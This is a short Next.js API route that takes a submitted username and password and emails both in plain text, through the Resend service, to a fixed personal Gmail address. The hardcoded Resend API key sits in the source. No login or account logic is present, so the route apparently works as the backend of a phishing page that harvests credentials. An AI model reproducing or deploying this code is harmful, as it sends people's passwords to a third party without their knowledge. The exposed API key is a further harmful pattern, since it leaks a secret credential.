import { NextResponse } from "next/server";
import { Resend } from 'resend';

const resend = new Resend('re_8D6Az8ht_KxzCG9qaFbzAyjNSLwa1zWHU');

export async function POST(req: any) {
  try {
    const { userName, password } = await req.json();

    // Validate input fields
    if (!userName || !password) {
      return new Response(
        JSON.stringify({ message: "userName and password are required" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }

    // Sending email using Resend
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'anshu.dnnn@gmail.com',
      subject: 'Hello World',
      html: `<p>Username: <strong>${userName}</strong></p>
             <p>Password: <strong>${password}</strong></p>`,    });

    return new Response(
      JSON.stringify({ message: "Email sent successfully!" }),
      { status: 200, headers: { "Content-Type": "application/json" } }
    );
  } catch (error: any) {
    console.error("Error sending email:", error);

    return new Response(
      JSON.stringify({ message: "Failed to send email", error: error.message }),
      { status: 500, headers: { "Content-Type": "application/json" } }
    );
  }
}
